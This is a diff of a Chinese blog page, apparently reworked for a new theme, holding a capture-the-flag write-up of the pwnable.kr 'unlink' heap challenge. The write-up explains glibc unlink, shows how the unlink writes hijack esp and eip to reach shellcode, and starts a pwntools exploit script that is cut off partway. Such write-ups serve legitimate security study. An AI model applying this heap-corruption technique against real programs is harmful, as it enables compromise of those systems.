@@ -1,389 +1,415 @@
 <!DOCTYPE html>
+<html lang="zh-cn">
+    <!-- title -->
 
 
 
 
-
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 3.9.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
-  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
-  <link rel="manifest" href="/images/manifest.json">
-  <meta name="msapplication-config" content="/images/browserconfig.xml">
-
-<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+<!-- keywords -->
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
-  <link rel="stylesheet" href="/lib/pace/pace-theme-mac-osx.min.css?v=1.0.2">
-  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
 
 
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.4.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":true,"show_result":true,"style":"mac"},
-    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: 'search.xml',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: '复制',
-      copy_success: '复制成功',
-      copy_failure: '复制失败'
-    },
-    sidebarPadding: 40
-  };
-</script>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="SkYe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="SkYe">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="一个渣渣极客er的笔记Blog">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>unlink - pwnable.kr · SkYe&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
 
-<script>
-    (function () {
-        if ('') {
-            if (prompt('请输入文章密码') !== '') {
-                alert('密码错误！');
-                if (history.length === 1) {
-                    location.replace("http://xxxxxxx.xxx"); // 这里替换成你的首页
-                } else {
-                    history.back();
-                }
-            }
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
         }
-    })();
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
 </script>
-  <meta name="description" content="预习知识什么是unlinkedunlinked 是堆溢出中的一种常见形式，通过将双向列表中的空闲块拿出来与将要free的物理相邻的块进行合并。（将双向链表上的chunk卸载下来与物理chunk合并）unlink漏洞条件有3个以上的空闲chunk链表，其中最前面的chunk存在有堆溢出unlink的触发">
-<meta name="keywords" content="pwn,pwnable.kr,堆,unlink">
-<meta property="og:type" content="article">
-<meta property="og:title" content="unlink - pwnable.kr">
-<meta property="og:url" content="https://skyedai910.github.io/unlinked-pwnable/index.html">
-<meta property="og:site_name" content="SkYe Blog">
-<meta property="og:description" content="预习知识什么是unlinkedunlinked 是堆溢出中的一种常见形式，通过将双向列表中的空闲块拿出来与将要free的物理相邻的块进行合并。（将双向链表上的chunk卸载下来与物理chunk合并）unlink漏洞条件有3个以上的空闲chunk链表，其中最前面的chunk存在有堆溢出unlink的触发">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/09/29/skBJaGIeO2LDSmp.png">
-<meta property="og:image" content="https://anquan.baidu.com/upload/ue/image/20190222/1550819912485582.jpg">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190414200335569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Nob3BwZXJDUA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://i.loli.net/2019/09/29/U1NvB3YsmtbJXDH.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/29/zTsGIFCKBnh32lP.png">
-<meta property="og:image" content="https://anquan.baidu.com/upload/ue/image/20190222/1550819912485582.jpg">
-<meta property="og:image" content="https://images2015.cnblogs.com/blog/1071926/201707/1071926-20170714154547056-1917497079.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/29/y8r4QgXz3GUmIHc.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/29/RxZXovqD6PMCFjf.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/29/6iAwIYcbFXzE8Bf.png">
-<meta property="og:updated_time" content="2019-10-02T13:53:56.546Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="unlink - pwnable.kr">
-<meta name="twitter:description" content="预习知识什么是unlinkedunlinked 是堆溢出中的一种常见形式，通过将双向列表中的空闲块拿出来与将要free的物理相邻的块进行合并。（将双向链表上的chunk卸载下来与物理chunk合并）unlink漏洞条件有3个以上的空闲chunk链表，其中最前面的chunk存在有堆溢出unlink的触发">
-<meta name="twitter:image" content="https://i.loli.net/2019/09/29/skBJaGIeO2LDSmp.png">
-  <link rel="canonical" href="https://skyedai910.github.io/unlinked-pwnable/">
 
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
-
-  <title>unlink - pwnable.kr | SkYe Blog</title>
-  
-
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?a7211121ad131786b3b450c7b06beeeb";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-  <div class="container use-motion">
-    <div class="headband"></div>
+    
+        <body class="post-body">
+    
+    
+<header class="header">
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">SkYe Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >SkYe&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">unlink - pwnable.kr</a>
+            </div>
     </div>
-        <p class="site-subtitle">万丈高楼平地起，勿以浮沙筑高台。</p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-      
-        
-        <li class="menu-item menu-item-home">
-      
     
+    <a class="home-link" href=/>SkYe's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
 
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-tags">
-      
+
+
+
+
+
+height:50vh;
+">
     
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-categories">
-      
+    <!-- 主页  -->
     
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-archives">
-      
     
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a href="javascript:;" class="popup-trigger">
-        
-          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
-      </li>
-    
-  </ul>
-
-</nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="搜索..." spellcheck="false"
-           type="text" id="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
-  </div>
-</div>
-    </header>
-
-    
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
+    <!-- 404页  -->
             
-
-          <div id="content" class="content">
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://source.unsplash.com/1600x900/?server,coding,network,data,laptop,code,developer,programming)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
             
-
-  <div id="posts" class="posts-expand">
-      <article itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block post">
-    <link itemprop="mainEntityOfPage" href="https://skyedai910.github.io/unlinked-pwnable/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="SkYe">
-      <meta itemprop="description" content="一个渣渣极客er的笔记Blog">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SkYe Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">unlink - pwnable.kr
-
-          
+            unlink - pwnable.kr
+            <!-- 404 -->
+            
         </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建时间：2019-09-30 20:00:00" itemprop="dateCreated datePublished" datetime="2019-09-30T20:00:00+08:00">2019-09-30</time>
-            </span>
-          
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
             
-
             
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-10-02 21:53:56" itemprop="dateModified" datetime="2019-10-02T21:53:56+08:00">2019-10-02</time>
-              </span>
+            <!-- 404 -->
             
-          
-
-          
-            <span id="busuanzi_container_page_pv">&nbsp;&nbsp;|&nbsp;&nbsp;阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
-
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
                 
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/pwnable-kr/" itemprop="url" rel="index"><span itemprop="name">pwnable.kr</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">本文字数：</span>
-              
-              <span>6.1k</span>
-            </span>
-          
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              
-              <span>6 分钟</span>
-            </span>
-          
-
-        </div>
-      </header>
-
+                    <div class= post-intro-tags >
     
+        <a class="post-tag" href="javascript:void(0);" data-tags = "pwn">pwn</a>
     
+        <a class="post-tag" href="javascript:void(0);" data-tags = "pwnable.kr">pwnable.kr</a>
     
-    <div class="post-body" itemprop="articleBody">
+        <a class="post-tag" href="javascript:void(0);" data-tags = "堆">堆</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "unlink">unlink</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.2k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/30</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
 
-      
-        <h2 id="预习知识"><a href="#预习知识" class="headerlink" title="预习知识"></a>预习知识</h2><h3 id="什么是unlinked"><a href="#什么是unlinked" class="headerlink" title="什么是unlinked"></a>什么是unlinked</h3><p>unlinked 是堆溢出中的一种常见形式，通过将双向列表中的空闲块拿出来与将要free的物理相邻的块进行合并。（将双向链表上的chunk卸载下来与物理chunk合并）</p><h4 id="unlink漏洞条件"><a href="#unlink漏洞条件" class="headerlink" title="unlink漏洞条件"></a>unlink漏洞条件</h4><p>有3个以上的空闲chunk链表，其中最前面的chunk存在有堆溢出</p><h4 id="unlink的触发"><a href="#unlink的触发" class="headerlink" title="unlink的触发"></a>unlink的触发</h4><a id="more"></a>
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
 
-<p>当使用free函数释放正在使用的chunk时，会相应地检查其相邻的chunk是否空闲。如果空间则将相邻的chunk与free的chunk进行合并。</p>
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="预习知识"><a href="#预习知识" class="headerlink" title="预习知识"></a>预习知识</h2><h3 id="什么是unlinked"><a href="#什么是unlinked" class="headerlink" title="什么是unlinked"></a>什么是unlinked</h3><p>unlinked 是堆溢出中的一种常见形式，通过将双向列表中的空闲块拿出来与将要free的物理相邻的块进行合并。（将双向链表上的chunk卸载下来与物理chunk合并）</p>
+<h4 id="unlink漏洞条件"><a href="#unlink漏洞条件" class="headerlink" title="unlink漏洞条件"></a>unlink漏洞条件</h4><p>有3个以上的空闲chunk链表，其中最前面的chunk存在有堆溢出</p>
+<h4 id="unlink的触发"><a href="#unlink的触发" class="headerlink" title="unlink的触发"></a>unlink的触发</h4><p>当使用free函数释放正在使用的chunk时，会相应地检查其相邻的chunk是否空闲。如果空间则将相邻的chunk与free的chunk进行合并。</p>
 <p>unlink有两个安全检测机制，都是针对chunk的header部分。</p>
 <p><img src="https://i.loli.net/2019/09/29/skBJaGIeO2LDSmp.png" alt></p>
 <blockquote>
@@ -499,7 +525,7 @@ BK-&gt;fd=FD&lt;=&gt;P-&gt;bk-&gt;fd= P-&gt;fd</code></pre><h4 id="unlink引发�
 <p>|                                      |</p>
 <p>———————————</p>
 <p>接下来调用unlink及其后面指令的原理简单记录：</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unlink之后得到的两条方程</span></span><br><span class="line">*（（A stack+<span class="number">0x10</span>）+ <span class="number">0</span>）= A heap +<span class="number">12</span></span><br><span class="line">*（（A heap +<span class="number">12</span>） + <span class="number">4</span>）= A stack+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//指针一化简得到</span></span><br><span class="line">*(ebp<span class="number">-0x14</span>+<span class="number">0x10</span>+<span class="number">0</span>)=shellcode + <span class="number">0x4</span></span><br><span class="line"><span class="comment">//ebp-0x4指向的值被覆写为shellcode + 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ebp-0x4指向的值shellcode+4被传入ecx</span></span><br><span class="line">mov ecx,[ebp+var_4]</span><br><span class="line"></span><br><span class="line"><span class="comment">//ecx-4指向的shellcode开始行被传入到esp中（shellcode+4-4）</span></span><br><span class="line">lea esp,[ecx<span class="number">-4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">//退出main，但是eip被修改为shellcode开始运行行，变成了运行shellcode</span></span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unlink之后得到的两条方程</span></span><br><span class="line">*（（A stack+<span class="number">0x10</span>）+ <span class="number">0</span>）= A heap +<span class="number">12</span></span><br><span class="line">*（（A heap +<span class="number">12</span>） + <span class="number">4</span>）= A stack+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//指针一化简得到</span></span><br><span class="line">*(ebp<span class="number">-0x14</span>+<span class="number">0x10</span>+<span class="number">0</span>)=shellcode + <span class="number">0x4</span></span><br><span class="line"><span class="comment">//ebp-0x4指向的值被覆写为shellcode + 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ebp-0x4指向的值shellcode+4被传入ecx</span></span><br><span class="line">mov ecx,[ebp+var_4]</span><br><span class="line"></span><br><span class="line"><span class="comment">//ecx-4指向的shellcode开始行被传入到esp中（shellcode+4-4）</span></span><br><span class="line">lea esp,[ecx<span class="number">-4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">//退出main，但是eip被修改为shellcode开始运行行，变成了运行shellcode</span></span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
 
 <h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">shell_addr = <span class="number">0x080484eb</span><span class="comment">#IDA函数列表可查得</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与服务器建立ssh链接</span></span><br><span class="line">s =  ssh(host=<span class="string">'pwnable.kr'</span>,</span><br><span class="line">         port=<span class="number">2222</span>,</span><br><span class="line">         user=<span class="string">'unlink'</span>,</span><br><span class="line">         password=<span class="string">'guest'</span></span><br><span class="line">        )</span><br><span class="line">p = s.process(<span class="string">"./unlink"</span>) <span class="comment"># 加载程序</span></span><br><span class="line"><span class="comment"># 获取 A 栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">"here is stack address leak: "</span>)</span><br><span class="line">stack_addr = p.recv(<span class="number">10</span>)</span><br><span class="line">stack_addr = int(stack_addr,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># 获取 A 堆地址</span></span><br><span class="line">p.recvuntil(<span class="string">"here is heap address leak: 